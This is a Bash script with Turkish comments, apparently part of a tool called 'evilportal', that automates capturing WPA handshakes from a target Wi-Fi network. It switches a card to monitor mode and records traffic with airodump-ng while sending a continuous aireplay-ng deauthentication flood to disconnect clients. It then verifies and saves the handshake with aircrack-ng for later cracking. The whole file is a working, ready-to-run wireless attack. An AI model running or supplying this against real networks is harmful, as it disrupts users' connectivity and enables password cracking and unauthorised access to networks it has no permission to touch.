#!/usr/bin/env bash
# ==============================================================
#  evilportal — WPA handshake yakala
#  Yakalanan handshake'i capture/handshake_<BSSID>.cap'e yazar.
#
#  Kullanım:
#    sudo ./autopwn.sh [BSSID] [KANAL] [SSID] [IFACE] [TIMEOUT]
#
#  Akış:
#    monitor mode → airodump-ng + deauth döngüsü → handshake yakalandı
#
#  Çıkışta arayüz eskisi gibi managed moda döner, NetworkManager geri açılır.
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"
source "$BASE/lib.sh"

BSSID="${1:-$TARGET_BSSID}"
CHAN="${2:-$CHANNEL}"
SSID="${3:-$TARGET_SSID}"
IFACE="${4:-$MON_IF}"
TIMEOUT="${5:-${CAPTURE_TIMEOUT:-60}}"

log(){  echo "[*] $*"; }
ok(){   echo "[+] $*"; }
err(){  echo "[-] $*"; }
warn(){ echo "[!] $*"; }

[[ $EUID -eq 0 ]] || { err "root gerekli"; exit 1; }

for b in airodump-ng aireplay-ng aircrack-ng iw; do
  command -v "$b" >/dev/null 2>&1 || {
    err "$b yok — sudo apt install aircrack-ng iw"; exit 1;
  }
done

[[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || {
  err "geçersiz BSSID: '$BSSID'"; exit 1;
}
[[ "$CHAN" =~ ^[0-9]+$ ]] || { err "geçersiz kanal: '$CHAN'"; exit 1; }
(( CHAN >= 1 && CHAN <= 196 )) || { err "kanal aralık dışı: $CHAN"; exit 1; }
[[ "$TIMEOUT" =~ ^[0-9]+$ ]] || { err "geçersiz zaman aşımı: '$TIMEOUT'"; exit 1; }
(( TIMEOUT >= 5 )) || { err "zaman aşımı en az 5 sn olmalı"; exit 1; }

iw dev "$IFACE" info >/dev/null 2>&1 || { err "arayüz yok: '$IFACE'"; exit 1; }

WORK="$BASE/capture/hs_$(printf '%s' "$BSSID" | tr -d ':')"
rm -rf "$WORK"
mkdir -p "$WORK" "$BASE/capture"

log "hedef      : $SSID ($BSSID), kanal $CHAN"
log "arayüz     : $IFACE"
log "zaman aşımı: ${TIMEOUT}s"

# -------------------------------------------------------------- monitor
airmon-ng check kill >/dev/null 2>&1 || true
ORIG_IF="$IFACE"
if ! MON=$(ep_set_monitor "$IFACE"); then
  err "$IFACE monitor mode'a alınamadı — kart desteklemiyor olabilir"
  exit 1
fi
IFACE="$MON"
log "monitor    : $IFACE"

iw dev "$IFACE" set channel "$CHAN" 2>/dev/null || {
  err "kanal $CHAN ayarlanamadı"; exit 1;
}

# -------------------------------------------------------------- temizlik
DUMP=""
DEAUTH=""
CLEANED=0

cleanup() {
  [[ "$CLEANED" == "1" ]] && return 0
  CLEANED=1

  if [[ -n "$DEAUTH" ]]; then
    pkill -P "$DEAUTH" 2>/dev/null
    kill "$DEAUTH" 2>/dev/null
    DEAUTH=""
  fi
  if [[ -n "$DUMP" ]]; then
    kill "$DUMP" 2>/dev/null
    DUMP=""
  fi
  wait 2>/dev/null

  # arayüzleri normale döndür
  if [[ "$IFACE" != "$ORIG_IF" ]]; then
    ep_drop_vif "$IFACE"
  fi
  ep_restore_iface "$ORIG_IF"
  ep_nm_restart
}
trap cleanup EXIT INT TERM

# -------------------------------------------------------------- yakalama
log "airodump-ng başlıyor"
airodump-ng -c "$CHAN" --bssid "$BSSID" --output-format pcap \
  -w "$WORK/cap" "$IFACE" > "$WORK/airodump.log" 2>&1 &
DUMP=$!

log "deauth döngüsü başlıyor (hedefe bağlı istemci olmalı)"
(
  n=0
  while :; do
    aireplay-ng --deauth 5 -a "$BSSID" "$IFACE" >/dev/null 2>&1
    (( n++ % 5 == 0 )) && iw dev "$IFACE" set channel "$CHAN" >/dev/null 2>&1
    sleep 2
  done
) &
DEAUTH=$!

CAPFILE=""
check_capture() {
  local f="$1"
  aircrack-ng "$f" 2>/dev/null | grep -qE "[1-9][0-9]* handshake" && return 0
  grep -qi "WPA handshake:" "$WORK/airodump.log" 2>/dev/null
}

for ((i = 1; i <= TIMEOUT; i++)); do
  sleep 1
  (( i % 2 == 1 )) && continue

  for f in "$WORK"/cap*.cap; do
    [[ -s "$f" ]] || continue
    if check_capture "$f"; then
      CAPFILE="$f"
      break 2
    fi
  done

  (( i % 10 == 0 )) && log "${i}s… handshake yok (deauth sürüyor)"
done

if [[ -z "$CAPFILE" ]]; then
  err "handshake yakalanamadı (${TIMEOUT}s)"
  err "hedefe bağlı aktif bir istemci yoksa deauth handshake üretmez"
  err "kanal/SSID doğru mu? 802.11w (PMF) aktif olabilir"
  exit 2
fi

ok "handshake yakalandı: $(basename "$CAPFILE")"
cleanup
trap cleanup EXIT INT TERM

if [[ ! -s "$CAPFILE" ]]; then
  err "capture dosyası boş: $CAPFILE"
  exit 2
fi

KEEP="$BASE/capture/handshake_$(printf '%s' "$BSSID" | tr -d ':').cap"
cp -f "$CAPFILE" "$KEEP" 2>/dev/null && log "kopya: $KEEP"

echo
ok "handshake capture/$(basename "$KEEP") dosyasına kaydedildi"
